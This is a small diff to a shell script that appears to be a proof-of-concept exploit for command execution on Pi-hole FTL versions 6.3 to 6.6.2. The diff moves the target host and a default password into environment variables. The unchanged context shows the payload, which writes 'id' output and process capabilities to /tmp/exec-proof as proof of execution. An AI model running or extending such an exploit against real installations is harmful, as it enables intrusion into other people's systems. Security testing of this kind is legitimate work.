@@ -14,8 +14,9 @@
 #
 # works on FTL 6.3 - 6.6.2
 #
-PIPASS="password"
-PIHOST="http://pi.hole"
+PIHOST="${PIHOST:-http://pi.hole}"
+PIPASS="${PIPASS:-password}"
+
 CMD="id > /tmp/exec-proof; grep Cap /proc/self/status >> /tmp/exec-proof"
 
 set -eu
